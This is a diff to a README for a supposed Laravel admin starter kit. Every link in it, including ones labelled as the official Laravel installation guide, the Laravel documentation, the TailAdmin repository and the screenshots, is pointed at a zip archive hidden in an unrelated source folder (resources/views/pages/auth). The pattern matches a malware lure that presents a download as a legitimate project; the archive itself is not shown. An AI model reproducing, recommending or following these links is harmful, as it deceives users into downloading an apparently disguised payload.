@@ -1,12 +1,12 @@
 # 🎉 TailAdmin-Laravel-Starter-Kit - Simple and Efficient Laravel Setup
 
-[![Download Now](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip%https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
+[![Download Now](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip%https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip)](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip)
 
 ## 🌟 Overview
 
-Welcome to the TailAdmin Laravel Starter Kit. This kit offers a simple yet effective solution to kickstart your Laravel projects with a clean and user-friendly dashboard design. Built on the [TailAdmin Laravel - Free Laravel Dashboard](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip), this kit ensures you have essential features right at your fingertips, without the complexity of advanced frameworks like React or Vue.
+Welcome to the TailAdmin Laravel Starter Kit. This kit offers a simple yet effective solution to kickstart your Laravel projects with a clean and user-friendly dashboard design. Built on the [TailAdmin Laravel - Free Laravel Dashboard](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip), this kit ensures you have essential features right at your fingertips, without the complexity of advanced frameworks like React or Vue.
 
-This kit combines the best elements from [LaravelDaily/starter-kit](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip) with TailAdmin components. You will benefit from a full simple Laravel authentication system, including login, registration, password reset, and user profile management. 
+This kit combines the best elements from [LaravelDaily/starter-kit](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip) with TailAdmin components. You will benefit from a full simple Laravel authentication system, including login, registration, password reset, and user profile management. 
 
 ## 🎨 Key Features
 
@@ -20,16 +20,16 @@ This kit combines the best elements from [LaravelDaily/starter-kit](https://raw.
 Here’s a sneak peek of what you can expect:
 
 1. User Profile Management:
-   ![](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
+   ![](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip)
 
 2. Login Screen:
-   ![](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
+   ![](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip)
 
 3. User Management Table:
-   ![](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
+   ![](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip)
 
 4. User Edit Form:
-   ![](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
+   ![](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -39,11 +39,11 @@ To get started with the TailAdmin Laravel Starter Kit, follow these steps:
 
 To download the starter kit, visit the Releases page below:
 
-[Download the Starter Kit](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
+[Download the Starter Kit](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip)
 
 ### 2. Install Laravel
 
-Before using the starter kit, ensure you have Laravel installed on your system. If you don't have it yet, you can follow the official [Laravel installation guide](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip).
+Before using the starter kit, ensure you have Laravel installed on your system. If you don't have it yet, you can follow the official [Laravel installation guide](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip).
 
 ### 3. Create a New Project
 
@@ -102,7 +102,7 @@ Now that your application is running, you can explore the features. Feel free to
 
 To sum up, you can start your journey with the TailAdmin Laravel Starter Kit by downloading it from the link below:
 
-[Download the Starter Kit](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
+[Download the Starter Kit](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -124,6 +124,6 @@ If you want to contribute to this project or suggest new features, feel free to 
 
 ## 🛠️ Support
 
-For further assistance, check out the [Laravel Documentation](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip) or visit the [TailAdmin Repository](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip).
+For further assistance, check out the [Laravel Documentation](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip) or visit the [TailAdmin Repository](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/resources/views/pages/auth/Kit-Admin-Tail-Starter-Laravel-1.8.zip).
 
 Enjoy your development journey with the TailAdmin Laravel Starter Kit!
